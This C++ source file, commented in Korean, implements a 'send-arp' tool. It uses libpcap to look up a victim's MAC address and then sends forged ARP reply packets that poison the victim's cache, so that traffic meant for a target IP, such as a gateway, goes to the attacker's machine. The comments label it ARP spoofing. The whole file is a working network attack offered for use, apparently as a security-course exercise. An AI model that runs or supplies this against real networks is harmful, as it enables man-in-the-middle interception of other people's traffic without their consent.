#include <cstdio>
#include <pcap.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <cstring>
#include <cstdlib>
#include "ethhdr.h"
#include "arphdr.h"
#include "mac.h"
#include "ip.h"

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;  // 이더넷 헤더를 담는 구조체
    ArpHdr arp_;  // ARP 헤더를 담는 구조체
};
#pragma pack(pop)

void usage() {
    // 사용법을 출력하는 함수
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

Mac get_my_mac(const char* dev) {
    // 현재 장치의 MAC 주소를 가져오는 함수
    // dev는 네트워크 인터페이스 이름을 나타냄 (예: "wlan0")
    
    int sock = socket(AF_INET, SOCK_DGRAM, 0);  // 소켓 생성
    if (sock < 0) {
        perror("socket");  // 소켓 생성 실패 시 에러 메시지 출력
        exit(1);  // 프로그램 종료
    }

    struct ifreq ifr;  // 네트워크 인터페이스 요청을 위한 구조체
    strcpy(ifr.ifr_name, dev);  // 인터페이스 이름 설정
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {  // MAC 주소 가져오기
        perror("ioctl");  // 가져오기 실패 시 에러 메시지 출력
        close(sock);  // 소켓 닫기
        exit(1);  // 프로그램 종료
    }
    close(sock);  // 소켓 닫기
    return Mac((uint8_t*)(ifr.ifr_hwaddr.sa_data));  // MAC 주소 반환
}

Ip get_my_ip(const char* dev) {
    // 현재 장치의 IP 주소를 가져오는 함수
    // dev는 네트워크 인터페이스 이름을 나타냄 (예: "wlan0")
    
    int sock = socket(AF_INET, SOCK_DGRAM, 0);  // 소켓 생성
    if (sock < 0) {
        perror("socket");  // 소켓 생성 실패 시 에러 메시지 출력
        exit(1);  // 프로그램 종료
    }

    struct ifreq ifr;  // 네트워크 인터페이스 요청을 위한 구조체
    strcpy(ifr.ifr_name, dev);  // 인터페이스 이름 설정
    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {  // IP 주소 가져오기
        perror("ioctl");  // 가져오기 실패 시 에러 메시지 출력
        close(sock);  // 소켓 닫기
        exit(1);  // 프로그램 종료
    }
    close(sock);  // 소켓 닫기
    return Ip(inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr));  // IP 주소 반환
}

Mac get_mac_from_ip(pcap_t* handle, const char* dev, Ip ip) {
    // 주어진 IP 주소를 가진 장치로부터 MAC 주소를 얻기 위해 ARP 요청을 보내는 함수
    // handle은 pcap 세션 핸들, dev는 네트워크 인터페이스 이름, ip는 대상 IP
    
    EthArpPacket packet;  // ARP 요청 패킷 구조체 생성

    // ARP 요청 패킷을 구성하는 부분
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // 브로드캐스트 MAC 주소 (모든 장치로 전송)
    packet.eth_.smac_ = get_my_mac(dev); // 공격자의 MAC 주소 (출발지 MAC 주소)
    packet.eth_.type_ = htons(EthHdr::Arp); // 이더넷 타입: ARP

    packet.arp_.hrd_ = htons(ArpHdr::ETHER); // 하드웨어 타입: 이더넷
    packet.arp_.pro_ = htons(EthHdr::Ip4); // 프로토콜 타입: IPv4
    packet.arp_.hln_ = Mac::SIZE; // 하드웨어 주소 길이: 6바이트 (MAC 주소)
    packet.arp_.pln_ = Ip::SIZE; // 프로토콜 주소 길이: 4바이트 (IP 주소)
    packet.arp_.op_ = htons(ArpHdr::Request); // ARP 요청(Operation): 1 (요청)
    packet.arp_.smac_ = get_my_mac(dev); // 출발지 MAC 주소
    packet.arp_.sip_ = get_my_ip(dev); // 출발지 IP 주소
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // 목적지 MAC 주소: 아직 알 수 없음
    packet.arp_.tip_ = ip; // 목적지 IP 주소

    // ARP 요청 패킷 전송
    int res = pcap_sendpacket(handle, (const u_char*)&packet, sizeof(EthArpPacket));
    if (res != 0) {
        // 전송 실패 시 에러 메시지 출력
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    // ARP 응답을 기다리며 MAC 주소를 얻기 위한 반복문
    while (true) {
        struct pcap_pkthdr* header;  // 패킷 헤더
        const u_char* reply;  // 응답 패킷
        res = pcap_next_ex(handle, &header, &reply);  // 패킷 캡처
        if (res == 0) continue;  // 타임아웃 시 계속 대기
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            // 패킷 캡처 실패 시 에러 메시지 출력
            fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        EthArpPacket* recv_packet = (EthArpPacket*)reply;  // 캡처한 응답 패킷을 ARP 패킷으로 캐스팅

        // ARP 응답 패킷인지 확인하고, 목적지 IP와 일치하면 MAC 주소 반환
        if (recv_packet->eth_.type_ == htons(EthHdr::Arp) && 
            recv_packet->arp_.op_ == htons(ArpHdr::Reply) && 
            recv_packet->arp_.sip_ == ip) {
            return recv_packet->arp_.smac_;  // 응답으로 받은 MAC 주소 반환
        }
    }

    return Mac("00:00:00:00:00:00"); // MAC 주소를 얻지 못한 경우 기본값 반환
}

int main(int argc, char* argv[]) {
    // 프로그램의 진입점
    if (argc < 4 || argc % 2 != 0) {
        // 인자 개수가 올바르지 않으면 사용법 출력
        usage();
        return -1;
    }

    char* dev = argv[1];  // 첫 번째 인자는 네트워크 인터페이스 이름
    char errbuf[PCAP_ERRBUF_SIZE];  // pcap 에러 버퍼
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);  // 네트워크 장치 열기
    if (handle == NULL) {
        // 장치 열기 실패 시 에러 메시지 출력
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    Mac my_mac = get_my_mac(dev);  // 내 MAC 주소 가져오기

    // 입력된 IP 쌍에 대해 ARP 스푸핑을 수행하는 루프
    for (int i = 2; i < argc; i += 2) {
        Ip sender_ip = Ip((inet_addr(argv[i])));  // 첫 번째 IP: 공격 대상 (발신자)
        Ip target_ip = Ip((inet_addr(argv[i + 1])));  // 두 번째 IP: 스푸핑할 대상 (목표)


        Mac sender_mac = get_mac_from_ip(handle, dev, sender_ip);  // 발신자의 MAC 주소 얻기

        EthArpPacket packet;  // ARP 스푸핑 패킷 생성

        // ARP 스푸핑 패킷 구성
        packet.eth_.dmac_ = sender_mac;  // 발신자의 MAC 주소 (대상 MAC 주소)
        packet.eth_.smac_ = my_mac;  // 내 MAC 주소 (출발지 MAC 주소)
        packet.eth_.type_ = htons(EthHdr::Arp);  // 이더넷 타입: ARP

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);  // 하드웨어 타입: 이더넷
        packet.arp_.pro_ = htons(EthHdr::Ip4);  // 프로토콜 타입: IPv4
        packet.arp_.hln_ = Mac::SIZE;  // 하드웨어 주소 길이: 6바이트
        packet.arp_.pln_ = Ip::SIZE;  // 프로토콜 주소 길이: 4바이트
        packet.arp_.op_ = htons(ArpHdr::Reply);  // ARP 응답(Operation): 2 (응답)
        packet.arp_.smac_ = my_mac;  // 내 MAC 주소
        packet.arp_.sip_ = target_ip;  // 스푸핑할 IP 주소 (목표의 IP)
        packet.arp_.tmac_ = sender_mac;  // 발신자의 MAC 주소
        packet.arp_.tip_ = sender_ip;  // 발신자의 IP 주소

        // ARP 스푸핑 패킷 전송
        int res = pcap_sendpacket(handle, (const u_char*)&packet, sizeof(EthArpPacket));
        if (res != 0) {
            // 전송 실패 시 에러 메시지 출력
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
    }

    pcap_close(handle);  // pcap 세션 닫기
}
